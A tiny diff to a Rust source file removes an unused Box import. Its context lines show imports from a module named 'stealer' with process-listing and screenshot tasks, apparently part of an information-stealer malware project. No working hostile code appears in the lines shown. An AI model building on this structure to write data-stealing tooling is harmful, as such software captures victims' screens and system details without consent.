@@ -3,8 +3,6 @@ mod processes;
 
 use crate::stealer::processes::ProcessesTask;
 use crate::stealer::screenshot::ScreenshotTask;
-#[allow(unused_imports)]
-use alloc::boxed::Box;
 use alloc::sync::Arc;
 use alloc::vec;
 use tasks::{CompositeTask, Task};
